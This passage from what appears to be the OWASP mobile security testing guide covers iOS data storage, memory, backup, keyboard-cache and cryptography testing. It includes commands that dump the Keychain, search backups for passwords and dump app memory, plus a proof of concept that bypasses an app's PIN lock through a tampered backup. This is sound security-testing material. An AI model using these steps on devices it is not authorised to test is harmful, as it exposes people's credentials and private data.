fields. If sensitive data is displayed in the output, the app fails this test. 406\nTesting Local Data Storage Platform: ios MASVSV1: MSTG-STORAGE-1,MSTG-STORAGE-2 MASVSV2: MASVS-STORAGE-1 Overview Static Analysis WhenyouhaveaccesstothesourcecodeofaniOSapp,identifysensitivedatathat’ssavedandprocessedthroughout the app. This includes passwords, secret keys, and personally identifiable information (PII), but it may as well include otherdataidentifiedassensitivebyindustryregulations,laws,andcompanypolicies. Lookforthisdatabeingsavedvia anyofthelocalstorageAPIslistedbelow. Makesurethatsensitivedataisneverstoredwithoutappropriateprotection. Forexample,authenticationtokensshould notbesavedinNSUserDefaultswithoutadditionalencryption. Alsoavoidstoringencryptionkeysin.plistfiles,hard- codedasstringsincode,orgeneratedusingapredictableobfuscationfunctionorkeyderivationfunctionbasedonstable attributes. SensitivedatashouldbestoredbyusingtheKeychainAPI(thatstorestheminsidetheSecureEnclave),orstoredencrypted using envelope encryption. Envelope encryption, or key wrapping, is a cryptographic construct that uses symmetric encryption to encapsulate key material. Data encryption keys (DEK) can be encrypted with key encryption keys (KEK) whichmustbesecurelystoredintheKeychain. EncryptedDEKcanbestoredinNSUserDefaultsorwritteninfiles. When required, application reads KEK, then decrypts DEK. Refer to OWASP Cryptographic Storage Cheat Sheet to learn more aboutencryptingcryptographickeys. Keychain TheencryptionmustbeimplementedsothatthesecretkeyisstoredintheKeychainwithsecuresettings,ideallykSe- cAttrAccessibleWhenPasscodeSetThisDeviceOnly. Thisensurestheusageofhardware-backedstoragemechanisms. MakesurethattheAccessControlFlagsaresetaccordingtothesecuritypolicyofthekeysintheKeyChain. GenericexamplesofusingtheKeyChaintostore,update,anddeletedatacanbefoundintheofficialAppledocumentation. TheofficialAppledocumentationalsoincludesanexampleofusingTouchIDandpasscodeprotectedkeys. Filesystem Usingthesourcecode,examinethedifferentAPIsusedtostoredatalocally. Makesurethatanydataisproperlyencrypted basedonitssensitivity. Dynamic Analysis Onewaytodeterminewhethersensitiveinformation(likecredentialsandkeys)isstoredinsecurelywithoutleveraging nativeiOSfunctionsistoanalyzetheapp’sdatadirectory. Triggeringallappfunctionalitybeforethedataisanalyzedis important because the app may store sensitive data only after specific functionality has been triggered. You can then performstaticanalysisforthedatadumpaccordingtogenerickeywordsandapp-specificdata. ThefollowingstepscanbeusedtodeterminehowtheapplicationstoresdatalocallyonajailbrokeniOSdevice: 1. Triggerthefunctionalitythatstorespotentiallysensitivedata. 2. ConnecttotheiOSdeviceandnavigatetoitsBundledirectory(thisappliestoiOSversions8.0andabove): /var/ mobile/Containers/Data/Application/$APP_ID/ 3. Executegrepwiththedatathatyou’vestored,forexample: grep -iRn "USERID". 4. Ifthesensitivedataisstoredinplaintext,theappfailsthistest. Youcananalyzetheapp’sdatadirectoryonanon-jailbrokeniOSdevicebyusingthird-partyapplications,suchasiMaz- ing. 407\n1. Triggerthefunctionalitythatstorespotentiallysensitivedata. 2. ConnecttheiOSdevicetoyourhostcomputerandlaunchiMazing. 3. Select“Apps”,right-clickthedesirediOSapplication,andselect“ExtractApp”. 4. Navigatetotheoutputdirectoryandlocate$APP_NAME.imazing. Renameitto$APP_NAME.zip. 5. UnpacktheZIPfile. Youcanthenanalyzetheapplicationdata. NotethattoolslikeiMazingdon’tcopydatadirectlyfromthedevice. Theytrytoextractdatafromthebackupsthey create. Therefore,gettingalltheappdatathat’sstoredontheiOSdeviceisimpossible: notallfoldersareincluded inbackups. UseajailbrokendeviceorrepackagetheappwithFridaanduseatoollikeobjectiontoaccessallthe dataandfiles. IfyouaddedtheFridalibrarytotheappandrepackageditasdescribedin“DynamicAnalysisonNon-JailbrokenDevices” (from the “Tampering and Reverse Engineering on iOS” chapter), you can use objection to transfer files directly from the app’s data directory or read files in objection as explained in the chapter “Basic Security Testing on iOS”, section “Host-DeviceDataTransfer”. TheKeychaincontentscanbedumpedduringdynamicanalysis. Onajailbrokendevice,youcanuseKeychaindumper asdescribedinthechapter“BasicSecurityTestingoniOS”. ThepathtotheKeychainfileis /private/var/Keychains/keychain-2.db Onanon-jailbrokendevice,youcanuseobjectiontodumptheKeychainitemscreatedandstoredbytheapp. Dynamic Analysis with Xcode and iOS simulator ThistestisonlyavailableonmacOS,asXcodeandtheiOSsimulatorisneeded. Fortestingthelocalstorageandverifyingwhatdataisstoredwithinit,it’snotmandatorytohaveaniOSdevice. With access to the source code and Xcode the app can be build and deployed in the iOS simulator. The file system of the currentdeviceoftheiOSsimulatorisavailablein~/Library/Developer/CoreSimulator/Devices. OncetheappisrunningintheiOSsimulator, youcannavigatetothedirectoryofthelatestsimulatorstartedwiththe followingcommand: $cd~/Library/Developer/CoreSimulator/Devices/$( ls-alht ~/Library/Developer/CoreSimulator/Devices |head -n2| awk'{print$9}' |sed-n'1!p')/data/Containers/Data/Application ThecommandabovewillautomaticallyfindtheUUIDofthelatestsimulatorstarted. Nowyoustillneedtogrepforyour appnameorakeywordinyourapp. ThiswillshowyoutheUUIDoftheapp. grep -iRn keyword. Thenyoucanmonitorandverifythechangesinthefilesystemoftheappandinvestigateifanysensitiveinformationis storedwithinthefileswhileusingtheapp. Dynamic Analysis with Objection Youcanusetheobjectionruntimemobileexplorationtoolkittofindvulnerabilitiescausedbytheapplication’sdatastorage mechanism. ObjectioncanbeusedwithoutaJailbrokendevice,butitwillrequirepatchingtheiOSApplication. Reading the Keychain TouseObjectiontoreadtheKeychain,executethefollowingcommand: 408\n...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #ioskeychaindump Note:YoumaybeaskedtoauthenticateusingthedevicespasscodeorTouchID Savetheoutputbyadding `--jsonkeychain.json`tothiscommand DumpingtheiOSkeychain... Created Accessible ACL Type Account Service Data ##TestingMemoryforSensitiveData >**Platform:**ios > >**MASVSV1:**MSTG-STORAGE-10 > >**MASVSV2:**MASVS-STORAGE-2 ###Overview ###StaticAnalysis Whenperformingstaticanalysisforsensitivedataexposedviamemory,youshould -trytoidentifyapplicationcomponentsandmapwherethedataisused, -makesurethatsensitivedataishandledwithasfewcomponentsaspossible, -makesurethatobjectreferencesareproperlyremovedoncetheobjectcontainingsensitivedataisnolongerneeded, -makesurethathighlysensitivedataisoverwrittenassoonasitisnolongerneeded, -notpasssuchdataviaimmutabledatatypes,suchas `String`and`NSString`, -avoidnon-primitivedatatypes (becausetheymightleavedatabehind), -overwritethevalueinmemorybeforeremovingreferences, -payattentiontothird-partycomponents (librariesandframeworks).HavingapublicAPIthathandlesdataaccordingtotherecommendationsaboveisagood ↪ indicatorthatdevelopersconsideredtheissuesdiscussedhere. ###DynamicAnalysis ThereareseveralapproachesandtoolsavailablefordynamicallytestingthememoryofaniOSappforsensitivedata. ####RetrievingandAnalyzingaMemoryDump Whetheryouareusingajailbrokenoranon-jailbrokendevice,youcandumptheapp'sprocess memorywith[objection](https://github.com/sensepost/objection ↪ "Objection")and[Fridump](https://github.com/Nightbringer21/fridump"Fridump").Youcanfindadetailedexplanationofthisprocessinthesection"[Memory ↪ Dump](../../../Document/0x06c-Reverse-Engineering-and-Tampering.md#memory-dump"MemoryDump")",inthechapter"TamperingandReverseEngineeringoniOS". Afterthememoryhasbeendumped(e.g.toafilecalled"memory"),dependingonthenatureofthedatayou'relookingfor,you'llneedasetofdifferenttoolsto ↪ processandanalyzethatmemorydump.Forinstance,ifyou'refocusingonstrings,itmightbesufficientforyoutoexecutethecommand`strings`or`rabin2 ↪ -zz`toextractthosestrings. ```bash ##usingstrings $stringsmemory >strings.txt ##usingrabin2 $rabin2 -ZZmemory >strings.txt Openstrings.txtinyourfavoriteeditoranddigthroughittoidentifysensitiveinformation. However if you’d like to inspect other kind of data, you’d rather want to use radare2 and its search capabilities. See radare2’shelponthesearchcommand(/?) formoreinformationandalistofoptions. Thefollowingshowsonlyasubset ofthem: $r2 <name_of_your_dump_file> [0x00000000]>/? Usage:/[!bf][arg] Searchstuff (see'e??search' foroptions) |Useio.vaforsearchinginnonvirtualaddressingspaces |/foo\x00 searchforstring 'foo\0' |/c[ar] searchforcryptomaterials |/e/E.F/i matchregularexpression |/ifoo searchforstring 'foo' ignoringcase |/m[?][ebm]magicfile searchformagic,filesystemsorbinaryheaders |/v[1248]value lookforan `cfg.bigendian`32bitvalue |/wfoo searchforwidestring 'f\0o\0o\0' |/xff0033 searchforhexstring |/zminmax searchforstringsofgivensize ... Runtime Memory Analysis By using r2frida you can analyze and inspect the app’s memory while running and without needing to dump it. For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values,etc. Whendoingso,remembertoprependthesearchcommand(andanyotherr2fridaspecificcommands)with abackslash: afterstartingthesessionwithr2 frida://usb//<name_of_your_app>. Formoreinformation,optionsandapproaches,pleaserefertosection“In-MemorySearch”inthechapter“Tamperingand ReverseEngineeringoniOS”. 409\nTesting Backups for Sensitive Data Platform: ios MASVSV1: MSTG-STORAGE-8 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis Abackupofadeviceonwhichamobileapplicationhasbeeninstalledwillincludeallsubdirectories(exceptforLibrary/ Caches/)andfilesintheapp’sprivatedirectory. Therefore,avoidstoringsensitivedatainplaintextwithinanyofthefilesorfoldersthatareintheapp’sprivatedirectory orsubdirectories. Although all the files in Documents/ and Library/Application Support/ are always backed up by default, you can excludefilesfromthebackupbycallingNSURLsetResourceValue:forKey:error: withtheNSURLIsExcludedFromBack- upKeykey. YoucanusetheNSURLIsExcludedFromBackupKeyandCFURLIsExcludedFromBackupKeyfilesystempropertiestoexclude filesanddirectoriesfrombackups. Anappthatneedstoexcludemanyfilescandosobycreatingitsownsubdirectory andmarkingthatdirectoryexcluded. Appsshouldcreatetheirowndirectoriesforexclusioninsteadofexcludingsystem- defineddirectories. Bothfilesystempropertiesarepreferabletothedeprecatedapproachofdirectlysettinganextendedattribute. Allapps runningoniOSversion5.1andlatershouldusethesepropertiestoexcludedatafrombackups. ThefollowingissampleObjective-CcodeforexcludingafilefromabackuponiOS5.1andlater: -(BOOL)addSkipBackupAttributeToItemAtPath:(NSString *)filePathString { NSURL*URL=[NSURLfileURLWithPath:filePathString]; assert([[NSFileManagerdefaultManager]fileExistsAtPath:[URLpath]]); NSError *error =nil; BOOLsuccess =[URLsetResourceValue:[NSNumbernumberWithBool:YES] forKey:NSURLIsExcludedFromBackupKeyerror: &error]; if(!success){ NSLog(@"Errorexcluding%@frombackup%@",[URLlastPathComponent], error); } return success; } ThefollowingissampleSwiftcodeforexcludingafilefromabackuponiOS5.1andlater,seeSwiftexcludingfilesfrom iCloudbackupformoreinformation: enum ExcludeFileError:Error { case fileDoesNotExist case error(String) } func excludeFileFromBackup(filePath:URL)->Result<Bool,ExcludeFileError>{ varfile =filePath do{ ifFileManager.default.fileExists(atPath:file.path){ varres=URLResourceValues() res.isExcludedFromBackup =true tryfile.setResourceValues(res) return .success(true) }else { return .failure(.fileDoesNotExist) } }catch { return .failure(.error("Errorexcluding \(file.lastPathComponent)frombackup \(error)")) } } 410\nDynamic Analysis Inordertotestthebackup,youobviouslyneedtocreateonefirst. ThemostcommonwaytocreateabackupofaniOS deviceisbyusingiTunes,whichisavailableforWindows,LinuxandofcoursemacOS(tillmacOSMojave). Whencreating abackupviaiTunesyoucanalwaysonlybackupthewholedeviceandnotselectjustasingleapp. Makesurethatthe option“Encryptlocalbackup”iniTunesisnotset,sothatthebackupisstoredincleartextonyourharddrive. iTunes is not available anymore from macOS Catalina onwards. Managing of an iOS device, including updates, backupandrestorehasbeenmovedtotheFinderapp. Theapproachremainsthesame,asdescribedabove. AftertheiOSdevicehasbeenbackedup,youneedtoretrievethefilepathofthebackup,whicharedifferentlocations oneachOS.TheofficialAppledocumentationwillhelpyoutolocatebackupsofyouriPhone,iPad,andiPodtouch. WhenyouwanttonavigatetothebackupfolderuptoHighSierrayoucaneasilydoso. StartingwithmacOSMojaveyou willgetthefollowingerror(evenasroot): $pwd /Users/foo/Library/ApplicationSupport $ls -alh MobileSync ls:MobileSync:Operationnotpermitted Thisisnotapermissionissueofthebackupfolder, butanewfeatureinmacOSMojave. Youcansolvethisproblemby grantingfulldiskaccesstoyourterminalapplicationbyfollowingtheexplanationonOSXDaily. BeforeyoucanaccessthedirectoryyouneedtoselectthefolderwiththeUDIDofyourdevice. Checkthesection“Getting theUDIDofaniOSdevice”inthe“iOSBasicSecurityTesting”chapteronhowtoretrievetheUDID. OnceyouknowtheUDIDyoucannavigateintothisdirectoryandyouwillfindthefullbackupofthewholedevice,which doesincludepictures,appdataandwhatevermighthavebeenstoredonthedevice. Reviewthedatathat’sinthebackedupfilesandfolders. Thestructureofthedirectoriesandfilenamesisobfuscated andwilllooklikethis: $pwd /Users/foo/Library/ApplicationSupport/MobileSync/Backup/416f01bd160932d2bf2f95f1f142bc29b1c62dcb/00 $ls |head -n3 000127b08898088a8a169b4f63b363a3adcf389b 0001fe89d0d03708d414b36bc6f706f567b08d66 000200a644d7d2c56eec5b89c1921dacbec83c3e Therefore,it’snotstraightforwardtonavigatethroughitandyouwillnotfindanyhintsoftheappyouwanttoanalyzein thedirectoryorfilename. YoucanconsiderusingtheiMazingsharewareutilitytoassisthere. Performadevicebackup withiMazinganduseitsbuilt-inbackupexplorertoeasilyanalyzeappcontainercontentsincludingoriginalpathsandfile names. WithoutiMazingorsimilarsoftwareyoumayneedtoresorttousinggreptoidentifysensitivedata. Thisisnotthemost thoroughapproachbutyoucantrysearchingforsensitivedatathatyouhavekeyedinwhileusingtheappbeforeyou madethebackup. Forexample: theusername,password,creditcarddata,PIIoranydatathatisconsideredsensitivein thecontextoftheapp. ~/Library/ApplicationSupport/MobileSync/Backup/<UDID> grep -iRn "password" . AsdescribedintheStaticAnalysissection,anysensitivedatathatyou’reabletofindshouldbeexcludedfromthebackup, encryptedproperlybyusingtheKeychainornotstoredonthedeviceinthefirstplace. Toidentifyifabackupisencrypted,youcancheckthekeynamed“IsEncrypted”fromthefile“Manifest.plist”,locatedat therootofthebackupdirectory. Thefollowingexampleshowsaconfigurationindicatingthatthebackupisencrypted: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC"-//Apple//DTDPLIST1.0//EN""http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> ... <key>Date</key> <date>2021-03-12T17:43:33Z</date> <key>IsEncrypted</key> <true/> ... </plist> 411\nIn case you need to work with an encrypted backup, there are some Python scripts in DinoSec’s GitHub repo, such as backup_tool.pyandbackup_passwd.py,thatwillserveasagoodstartingpoint. However,notethattheymightnotwork withthelatestiTunes/Finderversionsandmightneedtobetweaked. YoucanalsousethetooliOSbackuptoeasilyreadandextractfilesfromapassword-encryptediOSbackup. Proof of Concept: Removing UI Lock with Tampered Backup Asdiscussedearlier,sensitivedataisnotlimitedtojustuserdataandPII.Itcanalsobeconfigurationorsettingsfilesthat affectappbehavior,restrictfunctionality,orenablesecuritycontrols. Ifyoutakealookattheopensourcebitcoinwallet app,Bither,you’llseethatit’spossibletoconfigureaPINtolocktheUI.Andafterafeweasysteps,youwillseehowto bypassthisUIlockwithamodifiedbackuponanon-jailbrokendevice. Afteryouenablethepin,useiMazingtoperformadevicebackup: 1. SelectyourdevicefromthelistundertheAVAILABLEmenu. 2. ClickthetopmenuoptionBackUp. 3. Followpromptstocompletethebackupusingdefaults. Nextyoucanopenthebackuptoviewappcontainerfileswithinyourtargetapp: 1. SelectyourdeviceandclickBackupsonthetoprightmenu. 2. ClickthebackupyoucreatedandselectView. 3. NavigatetotheBitherappfromtheAppsdirectory. 412\nAtthispointyoucanviewallthebackedupcontentforBither. This is where you can begin parsing through the files looking for sensitive data. In the screenshot you’ll see the net. bither.plistfilewhichcontainsthepin_codeattribute. ToremovetheUIlockrestriction,simplydeletethepin_code attributeandsavethechanges. Fromthereit’spossibletoeasilyrestorethemodifiedversionofnet.bither.plistbackontothedeviceusingthelicensed versionofiMazing. Thefreeworkaround,however,istofindtheplistfileintheobfuscatedbackupgeneratedbyiTunes/Finder. Socreateyour backupofthedevicewithBither’sPINcodeconfigured. Then,usingthestepsdescribedearlier,findthebackupdirectory andgrepfor“pin_code”asshownbelow. $~/Library/ApplicationSupport/MobileSync/Backup/<UDID> $grep -iRn "pin_code" . Binaryfile./13/135416dd5f251f9251e0f07206277586b7eac6f6matches You’llseetherewasamatchonabinaryfilewithanobfuscatedname. Thisisyournet.bither.plistfile. Goaheadand renamethefilegivingitaplistextensionsoXcodecaneasilyopenitupforyou. 413\nAgain,removethepin_codeattributefromtheplistandsaveyourchanges. Renamethefilebacktotheoriginalname (i.e.,withouttheplistextension)andperformyourbackuprestore. Whentherestoreiscompleteyou’llseethatBitherno longerpromptsyouforthePINcodewhenlaunched. Finding Sensitive Data in the Keyboard Cache Platform: ios MASVSV1: MSTG-STORAGE-5 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis • Searchthroughthesourcecodeforsimilarimplementations,suchas textObject.autocorrectionType =UITextAutocorrectionTypeNo; textObject.secureTextEntry =YES; • OpenxibandstoryboardfilesintheInterface BuilderofXcodeandverifythestatesofSecure Text Entryand CorrectionintheAttributes Inspectorfortheappropriateobject. The application must prevent the caching of sensitive information entered into text fields. You can prevent caching by disablingitprogrammatically,usingthetextObject.autocorrectionType = UITextAutocorrectionTypeNodirectivein thedesiredUITextFields, UITextViews, andUISearchBars. Fordatathatshouldbemasked, suchasPINsandpasswords, settextObject.secureTextEntrytoYES. UITextField *textField =[[UITextFieldalloc ]initWithFrame:frame ]; textField.autocorrectionType =UITextAutocorrectionTypeNo; Dynamic Analysis IfajailbrokeniPhoneisavailable,executethefollowingsteps: 1. ResetyouriOSdevicekeyboardcachebynavigatingtoSettings > General > Reset > Reset Keyboard Dictio- nary. 414\n2. Usetheapplicationandidentifythefunctionalitiesthatallowuserstoentersensitivedata. 3. Dumpthekeyboardcachefilewiththeextension.datinthefollowingdirectoryanditssubdirectories. (whichmight bedifferentforiOSversionsbefore8.0): /private/var/mobile/Library/Keyboard/ 4. Lookforsensitivedata,suchasusername,passwords,emailaddresses,andcreditcardnumbers. Ifthesensitive datacanbeobtainedviathekeyboardcachefile,theappfailsthistest. UITextField *textField =[[UITextFieldalloc ]initWithFrame:frame ]; textField.autocorrectionType =UITextAutocorrectionTypeNo; Ifyoumustuseanon-jailbrokeniPhone: 1. Resetthekeyboardcache. 2. Keyinallsensitivedata. 3. Usetheappagainanddeterminewhetherautocorrectsuggestspreviouslyenteredsensitiveinformation. Determining Whether Sensitive Data Is Shared with Third Parties Platform: ios MASVSV1: MSTG-STORAGE-4 MASVSV2: MASVS-STORAGE-2 Overview Sensitiveinformationmightbeleakedtothirdpartiesbyseveralmeans. OniOStypicallyviathird-partyservicesembed- dedintheapp. The features these services provide can involve tracking services to monitor the user’s behavior while using the app, sellingbanneradvertisements,orimprovingtheuserexperience. Thedownsideisthatdevelopersdon’tusuallyknowthedetailsofthecodeexecutedviathird-partylibraries. Consequently, nomoreinformationthanisnecessaryshouldbesenttoaservice,andnosensitiveinformationshouldbedisclosed. Mostthird-partyservicesareimplementedintwoways: • withastandalonelibrary • withafullSDK Static Analysis To determine whether API calls and functions provided by the third-party library are used according to best practices, reviewtheirsourcecode,requestedpermissionsandcheckforanyknownvulnerabilities. Alldatathat’ssenttothird-partyservicesshouldbeanonymizedtopreventexposureofPII(PersonalIdentifiableInforma- tion)thatwouldallowthethirdpartytoidentifytheuseraccount. Nootherdata(suchasIDsthatcanbemappedtoa useraccountorsession)shouldbesenttoathirdparty. Dynamic Analysis Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server,youcanperformdynamicanalysisbylaunchingaman-in-the-middle(MITM)attackwithBurpSuiteProfessionalor OWASPZAP.Onceyouroutethetrafficthroughtheinterceptionproxy,youcantrytosniffthetrafficthatpassesbetween theappandserver. Allapprequeststhataren’tsentdirectlytotheserveronwhichthemainfunctionishostedshould becheckedforsensitiveinformation,suchasPIIinatrackeroradservice. 415\niOS Cryptographic APIs Overview Inthe“MobileAppCryptography”chapter,weintroducedgeneralcryptographybestpracticesanddescribedtypicalissues thatcanoccurwhencryptographyisusedincorrectly. Inthischapter,we’llgointomoredetailoniOS’scryptographyAPIs. We’llshowhowtoidentifyusageofthoseAPIsinthesourcecodeandhowtointerpretcryptographicconfigurations. When reviewingcode,makesuretocomparethecryptographicparametersusedwiththecurrentbestpracticeslinkedfromthis guide. Appleprovideslibrariesthatincludeimplementationsofmostcommoncryptographicalgorithms. Apple’sCryptographic ServicesGuideisagreatreference. Itcontainsgeneralizeddocumentationofhowtousestandardlibrariestoinitialize andusecryptographicprimitives,informationthatisusefulforsourcecodeanalysis. CryptoKit AppleCryptoKitwasreleasedwithiOS13andisbuiltontopofApple’snativecryptographiclibrarycorecryptowhichis FIPS140-2validated. TheSwiftframeworkprovidesastronglytypedAPIinterface,haseffectivememorymanagement, conformstoequatable,andsupportsgenerics. CryptoKitcontainssecurealgorithmsforhashing,symmetric-keycryptog- raphy, and public-key cryptography. The framework can also utilize the hardware based key manager from the Secure Enclave. AppleCryptoKitcontainsthefollowingalgorithms: Hashes: • MD5(InsecureModule) • SHA1(InsecureModule) • SHA-2256-bitdigest • SHA-2384-bitdigest • SHA-2512-bitdigest Symmetric-Key: • MessageAuthenticationCodes(HMAC) • AuthenticatedEncryption – AES-GCM – ChaCha20-Poly1305 Public-Key: • KeyAgreement – Curve25519 – NISTP-256 – NISTP-384 – NISTP-512 Examples: Generatingandreleasingasymmetrickey: letencryptionKey=SymmetricKey(size:.bits256) CalculatingaSHA-2512-bitdigest: letrawString="OWASPMTSG" letrawData=Data(rawString.utf8) lethash=SHA512.hash(data:rawData)//Computethedigest lettextHash=String(describing:hash) print(textHash)//Printhashtext FormoreinformationaboutAppleCryptoKit,pleasevisitthefollowingresources: 416\n• AppleCryptoKit|AppleDeveloperDocumentation • PerformingCommonCryptographicOperations|AppleDeveloperDocumentation • WWDC2019session709|CryptographyandYourApps • HowtocalculatetheSHAhashofaStringorDatainstance|HackingwithSwift CommonCrypto, SecKey and Wrapper libraries ThemostcommonlyusedClassforcryptographicoperationsistheCommonCrypto,whichispackedwiththeiOSruntime. ThefunctionalityofferedbytheCommonCryptoobjectcanbestbedissectedbyhavingalookatthesourcecodeofthe headerfile: • TheCommoncryptor.hgivestheparametersforthesymmetriccryptographicoperations. • TheCommonDigest.hgivestheparametersforthehashingAlgorithms. • TheCommonHMAC.hgivestheparametersforthesupportedHMACoperations. • TheCommonKeyDerivation.hgivestheparametersforsupportedKDFfunctions. • TheCommonSymmetricKeywrap.hgivesthefunctionusedforwrappingasymmetrickeywithaKeyEncryptionKey. Unfortunately,CommonCryptorlacksafewtypesofoperationsinitspublicAPIs,suchas: GCMmodeisonlyavailablein itsprivateAPIsSeeitssourcecode. Forthis,anadditionalbindingheaderisnecessaryorotherwrapperlibrariescanbe used. Next,forasymmetricoperations,AppleprovidesSecKey. AppleprovidesaniceguideinitsDeveloperDocumentationon howtousethis. Asnotedbefore: somewrapper-librariesexistforbothinordertoprovideconvenience. Typicallibrariesthatareusedare, forinstance: • IDZSwiftCommonCrypto • Heimdall • SwiftyRSA • RNCryptor • Arcane Third party libraries Therearevariousthirdpartylibrariesavailable,suchas: • CJOSE:WiththeriseofJWE,andthelackofpublicsupportforAESGCM,otherlibrarieshavefoundtheirway,such asCJOSE.CJOSEstillrequiresahigherlevelwrappingastheyonlyprovideaC/C++implementation. • CryptoSwift: AlibraryinSwift,whichcanbefoundatGitHub. Thelibrarysupportsvarioushash-functions,MAC- functions,CRC-functions,symmetricciphers,andpassword-basedkeyderivationfunctions. Itisnotawrapper,but afullyself-implementedversionofeachoftheciphers. Itisimportanttoverifytheeffectiveimplementationofa function. • OpenSSL:OpenSSListhetoolkitlibraryusedforTLS,writteninC.Mostofitscryptographicfunctionscanbeused todothevariouscryptographicactionsnecessary,suchascreating(H)MACs,signatures,symmetric-&asymmetric ciphers,hashing,etc.. Therearevariouswrappers,suchasOpenSSLandMIHCrypto. • LibSodium: Sodium is a modern, easy-to-use software library for encryption, decryption, signatures, password hashingandmore. Itisaportable,cross-compilable,installable,packageableforkofNaCl,withacompatibleAPI, andanextendedAPItoimproveusabilityevenfurther. SeeLibSodiumsdocumentationformoredetails. Thereare somewrapperlibraries,suchasSwift-sodium,NAChloride,andlibsodium-ios. • Tink: AnewcryptographylibrarybyGoogle. Googleexplainsitsreasoningbehindthelibraryonitssecurityblog. ThesourcescanbefoundatTinksGitHubrepository. • Themis: a Crypto library for storage and messaging for Swift, Obj-C, Android/Java, С++, JS, Python, Ruby, PHP, Go. Themis uses LibreSSL/OpenSSL engine libcrypto as a dependency. It supports Objective-C and Swift for key generation,securemessaging(e.g.payloadencryptionandsigning),securestorageandsettingupasecuresession. Seetheirwikiformoredetails. • Others: Therearemanyotherlibraries,suchasCocoaSecurity,Objective-C-RSA,andaerogear-ios-crypto. Some ofthesearenolongermaintainedandmightneverhavebeensecurityreviewed. Likealways,itisrecommended tolookforsupportedandmaintainedlibraries. 417\n• DIY: An increasing amount of developers have created their own implementation of a cipher or a cryptographic function. This practice is highly discouraged and should be vetted very thoroughly by a cryptography expert if used. Key Management Therearevariousmethodsonhowtostorethekeyonthedevice. Notstoringakeyatallwillensurethatnokeymaterial canbedumped. ThiscanbeachievedbyusingaPasswordKeyDerivationfunction,suchasPKBDF-2. Seetheexample below: funcpbkdf2SHA1(password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ returnpbkdf2(hash:CCPBKDFAlgorithm(kCCPRFHmacAlgSHA1),password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } funcpbkdf2SHA256(password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ returnpbkdf2(hash:CCPBKDFAlgorithm(kCCPRFHmacAlgSHA256),password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } funcpbkdf2SHA512(password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ returnpbkdf2(hash:CCPBKDFAlgorithm(kCCPRFHmacAlgSHA512),password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } funcpbkdf2(hash:CCPBKDFAlgorithm,password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ letpasswordData=password.data(using:String.Encoding.utf8)! varderivedKeyData=Data(repeating:0,count:keyByteCount) letderivedKeyDataLength=derivedKeyData.count letderivationStatus=derivedKeyData.withUnsafeMutableBytes{derivedKeyBytesin salt.withUnsafeBytes{saltBytesin CCKeyDerivationPBKDF( CCPBKDFAlgorithm(kCCPBKDF2), password,passwordData.count, saltBytes,salt.count, hash, UInt32(rounds), derivedKeyBytes,derivedKeyDataLength ) } } ifderivationStatus!=0{ //Error returnnil } returnderivedKeyData } functestKeyDerivation(){ letpassword="password" letsalt=Data([0x73,0x61,0x6C,0x74,0x44,0x61,0x74,0x61]) letkeyByteCount=16 letrounds=100_000 letderivedKey=pbkdf2SHA1(password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } • Source: https://stackoverflow.com/questions/8569555/pbkdf2-using-commoncrypto-on-ios,testedinthetestsuite oftheArcanelibrary When you need to store the key, it is recommended to use the Keychain as long as the protection class chosen is not kSecAttrAccessibleAlways. Storingkeysinanyotherlocation,suchastheNSUserDefaults,propertylistfilesorbyany othersinkfromCoreDataorRealm,isusuallylesssecurethanusingtheKeyChain. EvenwhenthesyncofCoreDataor RealmisprotectedbyusingNSFileProtectionCompletedataprotectionclass,westillrecommendusingtheKeyChain. Seethechapter“DataStorageoniOS”formoredetails. TheKeyChainsupportstwotypeofstoragemechanisms: akeyiseithersecuredbyanencryptionkeystoredinthesecure enclaveorthekeyitselfiswithinthesecureenclave. ThelatteronlyholdswhenyouuseanECDHsigningkey. Seethe AppleDocumentationformoredetailsonitsimplementation. Thelastthreeoptionsconsistofusinghardcodedencryptionkeysinthesourcecode,havingapredictablekeyderivation functionbasedonstableattributes,andstoringgeneratedkeysinplacesthataresharedwithotherapplications. Using hardcoded encryption keys is obviously not the way to go, as this would mean that every instance of the application usesthesameencryptionkey. Anattackerneedsonlytodotheworkonceinordertoextractthekeyfromthesource code(whetherstorednativelyorinObjective-C/Swift). Consequently,theattackercandecryptanyotherdatathatwas encryptedbytheapplication. Next,whenyouhaveapredictablekeyderivationfunctionbasedonidentifierswhichare 418\naccessibletootherapplications,theattackeronlyneedstofindtheKDFandapplyittothedeviceinordertofindthekey. Lastly,storingsymmetricencryptionkeyspubliclyalsoishighlydiscouraged. Twomorenotionsyoushouldneverforgetwhenitcomestocryptography: 1. Alwaysencrypt/verifywiththepublickeyandalwaysdecrypt/signwiththeprivatekey. 2. Neverreusethekey(pair)foranotherpurpose: thismightallowleakinginformationaboutthekey: haveaseparate keypairforsigningandaseparatekey(pair)forencryption. Random Number Generator AppleprovidesaRandomizationServicesAPI,whichgeneratescryptographicallysecurerandomnumbers. TheRandomizationServicesAPIusestheSecRandomCopyBytesfunctiontogeneratenumbers. Thisisawrapperfunction forthe/dev/randomdevicefile,whichprovidescryptographicallysecurepseudorandomvaluesfrom0to255. Makesure thatallrandomnumbersaregeneratedwiththisAPI.Thereisnoreasonfordeveloperstouseadifferentone. Verifying the Configuration of Cryptographic Standard Algorithms Platform: ios MASVSV1: MSTG-CRYPTO-2,MSTG-CRYPTO-3 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Foreachofthelibrariesthatareusedbytheapplication,theusedalgorithmsandcryptographicconfigurationsneedto beverifiedtomakesuretheyarenotdeprecatedandusedcorrectly. Payattentiontohow-to-be-removedkey-holdingdatastructuresandplain-textdatastructuresaredefined. Ifthekeyword letisused,thenyoucreateanimmutablestructurewhichishardertowipefrommemory. Makesurethatitispartofa parentstructurewhichcanbeeasilyremovedfrommemory(e.g.astructthatlivestemporally). 